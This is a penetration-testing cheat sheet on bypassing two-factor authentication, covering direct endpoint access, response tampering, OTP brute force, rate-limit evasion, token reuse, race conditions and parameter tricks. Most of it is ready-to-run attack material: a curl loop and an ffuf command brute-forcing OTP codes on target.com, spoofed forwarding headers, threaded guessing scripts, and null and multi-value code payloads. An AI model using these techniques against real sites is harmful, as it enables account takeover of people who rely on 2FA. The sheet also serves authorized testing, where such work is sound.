---
tags:
  - high
  - logic
---

# 2FA/MFA Bypass Techniques

## TL;DR

2FA can be bypassed through direct endpoint access, response manipulation, brute force, and implementation flaws.

```
# Quick wins
Skip 2FA page → Access /dashboard directly
Modify response: {"success":false} → {"success":true}
Try blank/null OTP codes
Brute force 4-6 digit codes
```

---

## Exploitation

### 1. Direct Endpoint Access

Skip 2FA verification entirely:

```http
# Instead of going through /2fa-verify
# Directly access protected pages
GET /dashboard
GET /api/user/profile
GET /account/settings
```

**Referrer manipulation:**
```http
GET /dashboard HTTP/1.1
Referer: https://target.com/2fa-verify
```

### 2. Response Manipulation

**Modify server response:**
```json
// Original
{"success": false, "error": "Invalid OTP"}

// Modified  
{"success": true}
```

**Status code change:**
```
HTTP/1.1 401 Unauthorized → HTTP/1.1 200 OK
```

**Remove blocking fields:**
```json
// Remove these
"error": "...",
"2fa_required": true,
"mfa_required": true
```

### 3. Brute Force Attacks

**No rate limit:**
```bash
# 4-digit (10,000 combinations)
for i in $(seq -w 0 9999); do
  curl -X POST https://target.com/verify-otp -d "code=$i"
done

# 6-digit with ffuf
ffuf -u https://target.com/verify -X POST \
  -d '{"code":"FUZZ"}' -w <(seq -w 0 999999) \
  -mc 200 -fr "invalid"
```

### 4. Rate Limit Bypass

**Code resend resets counter:**
```
1. Try 3 codes (rate limited)
2. POST /resend-otp
3. Counter resets → Try 3 more
4. Repeat
```

**IP rotation:**
```http
X-Forwarded-For: 1.1.1.1
X-Real-IP: 2.2.2.2
X-Originating-IP: 3.3.3.3
```

**Session rotation:**
```python
for attempt in range(9999):
    if attempt % 10 == 0:
        session = get_new_session()
    try_code(session, code)
```

### 5. Token Reuse

**Previously used tokens:**
```
# Save valid OTP, use later
OTP from 5 minutes ago still works?
```

**Cross-account token:**
```http
POST /verify-2fa
Cookie: victim_session
code=YOUR_VALID_OTP
```

### 6. Backup Code Issues

**Predictable codes:**
```
ABC001, ABC002, ABC003...
```

**Disclosure via API:**
```http
GET /api/user/backup-codes
```

### 7. Password Reset Bypass

```
1. Request password reset
2. Complete reset
3. Login without 2FA prompt
```

### 8. OAuth/SSO Bypass

```http
# OAuth flow may skip 2FA
GET /oauth/google/callback?code=...
```

### 9. Race Conditions

**Parallel OTP submission:**
```python
import threading
for code in codes[:100]:
    threading.Thread(target=try_code, args=(code,)).start()
```

**Enable 2FA + Login race:**
```
Thread 1: Enable 2FA
Thread 2: Login
# Login may complete before 2FA enabled
```

### 10. "Remember Me" Exploitation

**Predictable token:**
```
Cookie: remember_me=base64(user_id:timestamp)
Cookie: remember_me=md5(username)
```

### 11. Blank/Null Code Acceptance

```http
code=
code=null
code=000000
code=undefined
# Or omit parameter
```

---

## Bypasses

### Multi-value submission

```http
code=000000&code=123456
code[]=000000&code[]=123456
{"code":["000000","123456"]}
code=000000,123456
```

### Encoding tricks

```
code=%00123456
code=123456%00
code=12%0034%0056
```

### Alternative parameters

```
otp=123456
one_time_code=123456
verification_code=123456
mfa_code=123456
```

---

## Real Examples

**Response manipulation (401→200):**
```
Valid OTP returns 200
Brute force until 200 despite 401 spam
```

**NextCloud session mixing:**
```python
session1 = login(creds)  # Gets 2FA block + token A
session2 = login(creds)  # Gets 2FA block + token B
# Mix tokens → session1 bypasses 2FA
```

---

## Checklist

- [ ] Try accessing post-auth pages directly
- [ ] Manipulate 2FA verification response
- [ ] Test blank/null OTP codes
- [ ] Check rate limiting (IP rotation, session reset)
- [ ] Test code resend behavior
- [ ] Try previously used codes
- [ ] Test backup code predictability
- [ ] Check if password reset disables 2FA
- [ ] Test OAuth/SSO login paths
- [ ] Look for race conditions
- [ ] Test "remember me" token security
- [ ] Try multi-value code submission

---

## Tools

- **Caido** — Intercept and modify responses
- **Turbo Intruder** — High-speed brute force with race conditions
- **ffuf** — Fast OTP brute forcing
